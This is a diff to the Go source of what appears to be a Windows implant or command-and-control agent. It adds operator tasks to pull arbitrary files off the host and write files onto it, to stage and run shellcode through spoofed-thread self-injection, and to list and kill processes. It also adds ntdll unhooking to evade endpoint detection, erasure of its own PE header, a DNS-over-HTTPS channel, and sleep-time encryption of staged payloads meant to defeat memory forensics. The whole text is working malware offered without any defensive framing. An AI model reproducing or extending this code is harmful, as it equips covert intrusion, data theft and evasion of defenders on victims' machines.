@@ -7,6 +7,7 @@ import (
 	"encoding/binary"
 	"fmt"
 	"math/rand"
+	"os"
 	"os/exec"
 	"time"
 
@@ -21,6 +22,10 @@ type Agent struct {
 	running  bool
 	ctx      context.Context
 	cancel   context.CancelFunc
+
+	stageBuf   []byte
+	sleepKey   []byte
+	beaconCtr  int
 }
 
 type TaskType uint8
@@ -30,12 +35,18 @@ const (
 	TaskInject      TaskType = 0x02
 	TaskPatch       TaskType = 0x03
 	TaskSleep       TaskType = 0x04
+	TaskDownload    TaskType = 0x05
+	TaskUpload      TaskType = 0x06
+	TaskRotateKey   TaskType = 0x07
+	TaskStage       TaskType = 0x08
 	TaskExit        TaskType = 0xFF
 	TaskEvasion     TaskType = 0x10
 	TaskHandles     TaskType = 0x11
 	TaskVault       TaskType = 0x12
 	TaskFingerprint TaskType = 0x13
 	TaskToken       TaskType = 0x14
+	TaskProcs       TaskType = 0x15
+	TaskKillProc    TaskType = 0x16
 )
 
 type TaskResult struct {
@@ -67,6 +78,9 @@ func New(cfg *Config) (*Agent, error) {
 			JitterMax:  cfg.JitterMax,
 			Key:        cfg.Key,
 			UserAgent:  cfg.UserAgent,
+			DoHURL:     cfg.DoHURL,
+			DoHDomain:  cfg.DoHDomain,
+			DoHAddr:    cfg.ServerAddr,
 			TimeoutSec: 10,
 			MaxRetries: 3,
 		})
@@ -99,6 +113,13 @@ func (a *Agent) Run() {
 }
 
 func (a *Agent) beacon() *channels.Message {
+	a.beaconCtr++
+	if a.config.UnhookEvery > 0 && a.beaconCtr%a.config.UnhookEvery == 0 {
+		go func() {
+			_, _ = syscallwin.CheckAndUnhook()
+		}()
+	}
+
 	for _, ch := range a.channels {
 		msg := &channels.Message{
 			Type: 0x01, // Beacon
@@ -140,6 +161,14 @@ func (a *Agent) executeTask(task *channels.Message) *TaskResult {
 		return a.handlePatch(task, result, taskData)
 	case TaskSleep:
 		return a.handleSleep(task, result, taskData)
+	case TaskDownload:
+		return a.handleDownload(task, result, taskData)
+	case TaskUpload:
+		return a.handleUpload(task, result, taskData)
+	case TaskRotateKey:
+		return a.handleRotateKey(task, result, taskData)
+	case TaskStage:
+		return a.handleStage(task, result, taskData)
 	case TaskEvasion:
 		return a.handleEvasion(task, result, taskData)
 	case TaskHandles:
@@ -150,6 +179,10 @@ func (a *Agent) executeTask(task *channels.Message) *TaskResult {
 		return a.handleFingerprint(task, result, taskData)
 	case TaskToken:
 		return a.handleToken(task, result, taskData)
+	case TaskProcs:
+		return a.handleProcs(task, result, taskData)
+	case TaskKillProc:
+		return a.handleKillProc(task, result, taskData)
 	case TaskExit:
 		a.running = false
 		result.Status = 0x00
@@ -193,15 +226,8 @@ func (a *Agent) handleInject(task *channels.Message, result *TaskResult, data []
 	pid := binary.LittleEndian.Uint32(data[:4])
 	shellcode := data[4:]
 
-	// Use polymorphic injection — auto-rotates between 4 methods
-	method := syscallwin.InjectionMethod(data[0] & 0xFF)
-	var err error
-	if method == 0xFF {
-		err = syscallwin.Inject(pid, shellcode)
-	} else {
-		err = syscallwin.InjectWithMethod(pid, shellcode, method)
-	}
-
+	// Rotating polymorphic injection — auto-cycles between all four methods.
+	err := syscallwin.Inject(pid, shellcode)
 	if err != nil {
 		result.Status = 0x01
 		result.Output = []byte(err.Error())
@@ -209,14 +235,154 @@ func (a *Agent) handleInject(task *channels.Message, result *TaskResult, data []
 	}
 
 	result.Status = 0x00
-	result.Output = []byte(fmt.Sprintf("injected %d bytes into PID %d (method=%d)", len(shellcode), pid, method))
+	result.Output = []byte(fmt.Sprintf("injected %d bytes into PID %d", len(shellcode), pid))
+	return result
+}
+
+func (a *Agent) handleDownload(task *channels.Message, result *TaskResult, data []byte) *TaskResult {
+	if len(data) == 0 {
+		result.Status = 0x01
+		result.Output = []byte("download: empty path")
+		return result
+	}
+
+	data, err := os.ReadFile(string(data))
+	if err != nil {
+		result.Status = 0x01
+		result.Output = []byte(err.Error())
+		return result
+	}
+
+	result.Status = 0x00
+	result.Output = data
+	return result
+}
+
+func (a *Agent) handleUpload(task *channels.Message, result *TaskResult, data []byte) *TaskResult {
+	if len(data) < 3 {
+		result.Status = 0x01
+		result.Output = []byte("upload: need pathLen(2) + path + payload")
+		return result
+	}
+
+	pathLen := int(binary.LittleEndian.Uint16(data[:2]))
+	if pathLen == 0 || 2+pathLen > len(data) {
+		result.Status = 0x01
+		result.Output = []byte("upload: bad path length")
+		return result
+	}
+
+	path := string(data[2 : 2+pathLen])
+	payload := data[2+pathLen:]
+
+	if err := os.WriteFile(path, payload, 0644); err != nil {
+		result.Status = 0x01
+		result.Output = []byte(err.Error())
+		return result
+	}
+
+	result.Status = 0x00
+	result.Output = []byte(fmt.Sprintf("uploaded %d bytes to %s", len(payload), path))
+	return result
+}
+
+func (a *Agent) handleRotateKey(task *channels.Message, result *TaskResult, data []byte) *TaskResult {
+	if len(data) != 32 {
+		result.Status = 0x01
+		result.Output = fmt.Appendf(nil, "rotatekey: expected 32 bytes, got %d", len(data))
+		return result
+	}
+
+	a.config.Key = append(a.config.Key[:0], data...)
+	result.Status = 0x00
+	result.Output = []byte("session key rotated")
+	return result
+}
+
+func (a *Agent) handleStage(task *channels.Message, result *TaskResult, data []byte) *TaskResult {
+	if len(data) < 1 {
+		result.Status = 0x01
+		result.Output = []byte("stage: missing chunk")
+		return result
+	}
+
+	finalFlag := data[0]
+	chunk := data[1:]
+	a.stageBuf = append(a.stageBuf, chunk...)
+
+	if finalFlag == 0 {
+		result.Status = 0x00
+		result.Output = []byte(fmt.Sprintf("staged %d bytes (more pending)", len(a.stageBuf)))
+		return result
+	}
+
+	if len(a.stageBuf) == 0 {
+		result.Status = 0x01
+		result.Output = []byte("stage: empty payload")
+		return result
+	}
+
+	payload := a.stageBuf
+	a.stageBuf = nil
+
+	if err := syscallwin.InjectSelfSpoof(payload); err != nil {
+		result.Status = 0x01
+		result.Output = []byte(err.Error())
+		return result
+	}
+
+	result.Status = 0x00
+	result.Output = []byte(fmt.Sprintf("staged and executed %d bytes (spoofed thread)", len(payload)))
+	return result
+}
+
+func (a *Agent) handleProcs(task *channels.Message, result *TaskResult, data []byte) *TaskResult {
+	out, err := syscallwin.ListProcesses()
+	if err != nil {
+		result.Status = 0x01
+		result.Output = []byte(err.Error())
+		return result
+	}
+
+	result.Status = 0x00
+	result.Output = out
+	return result
+}
+
+func (a *Agent) handleKillProc(task *channels.Message, result *TaskResult, data []byte) *TaskResult {
+	if len(data) < 4 {
+		result.Status = 0x01
+		result.Output = []byte("killproc: need 4 bytes (pid)")
+		return result
+	}
+
+	pid := binary.LittleEndian.Uint32(data[:4])
+	var clientID syscallwin.ClientId
+	clientID.UniqueProcess = uintptr(pid)
+
+	var handle uintptr
+	if err := syscallwin.NtOpenProcess(&handle, syscallwin.PROCESS_TERMINATE, 0, &clientID); err != nil {
+		result.Status = 0x01
+		result.Output = []byte(err.Error())
+		return result
+	}
+	defer syscallwin.NtClose(handle)
+
+	if err := syscallwin.NtTerminateProcess(handle, 0); err != nil {
+		result.Status = 0x01
+		result.Output = []byte(err.Error())
+		return result
+	}
+
+	result.Status = 0x00
+	result.Output = []byte(fmt.Sprintf("terminated PID %d", pid))
 	return result
 }
 
 func (a *Agent) handleEvasion(task *channels.Message, result *TaskResult, data []byte) *TaskResult {
 	if len(data) < 1 {
 		result.Status = 0x01
-		result.Output = []byte("evasion: sub-command required (1=full, 2=vm, 3=sandbox, 4=debug, 5=timing, 6=report)")
+		result.Output = []byte("evasion: sub-command required (1=full, 2=vm, 3=sandbox, 4=debug, 5=timing, 6=report, 7=hookscan, 8=erase)")
 		return result
 	}
 
@@ -262,6 +428,33 @@ func (a *Agent) handleEvasion(task *channels.Message, result *TaskResult, data [
 		result.Status = 0x00
 		result.Output = []byte(fmt.Sprintf("score=%d indicators=%d details=%v",
 			report.Score, len(report.Indicators), report.Indicators))
+	case 0x07:
+		hooked, err := syscallwin.DetectNtdllHooks()
+		if err != nil {
+			result.Status = 0x01
+			result.Output = []byte(err.Error())
+			return result
+		}
+		if len(hooked) == 0 {
+			result.Status = 0x00
+			result.Output = []byte("ntdll clean (no hooks)")
+			return result
+		}
+		if err := syscallwin.UnhookNtdll(); err != nil {
+			result.Status = 0x01
+			result.Output = []byte(fmt.Sprintf("hooked=%v err=%v", hooked, err))
+			return result
+		}
+		result.Status = 0x00
+		result.Output = []byte(fmt.Sprintf("restored ntdll (%d functions hooked): %v", len(hooked), hooked))
+	case 0x08:
+		if err := syscallwin.EraseSelfPEHeader(); err != nil {
+			result.Status = 0x01
+			result.Output = []byte(err.Error())
+			return result
+		}
+		result.Status = 0x00
+		result.Output = []byte("self PE header erased")
 	default:
 		result.Status = 0x01
 		result.Output = []byte("unknown evasion sub-command")
@@ -447,6 +640,19 @@ func (a *Agent) sendResult(result *TaskResult) {
 }
 
 func (a *Agent) sleep() {
+	// Sleep obfuscation: anything staged but not yet executed (or the
+	// staged buffer mid-transfer) is pushed into a ciphered alias while we
+	// idle. Heap forensics during a defensive sweep recovers ciphertext.
+	if len(a.stageBuf) > 0 {
+		a.sleepKey = make([]byte, 32)
+		_, _ = rand.Read(a.sleepKey)
+		enc := syscallwin.VaultEncryptBytes(a.sleepKey, a.stageBuf)
+		for i := range a.stageBuf {
+			a.stageBuf[i] = 0
+		}
+		a.stageBuf = enc
+	}
+
 	sleepTime := time.Duration(a.config.Sleep) * time.Second
 	jitter := time.Duration(rand.Intn(a.config.JitterMax-a.config.JitterMin)+a.config.JitterMin) * time.Second
 	total := sleepTime + jitter
@@ -458,8 +664,21 @@ func (a *Agent) sleep() {
 	case <-a.ctx.Done():
 		return
 	case <-timer.C:
-		return
+		// fall through to decrypt staged buffer
 	}
+
+	if len(a.stageBuf) > 0 && a.sleepKey != nil {
+		raw := syscallwin.VaultDecryptBytes(a.sleepKey, a.stageBuf)
+		for i := range a.sleepKey {
+			a.sleepKey[i] = 0
+		}
+		a.sleepKey = nil
+		for i := range a.stageBuf {
+			a.stageBuf[i] = 0
+		}
+		a.stageBuf = raw
+	}
+	a.sleepKey = nil
 }
 
 func (a *Agent) Stop() {
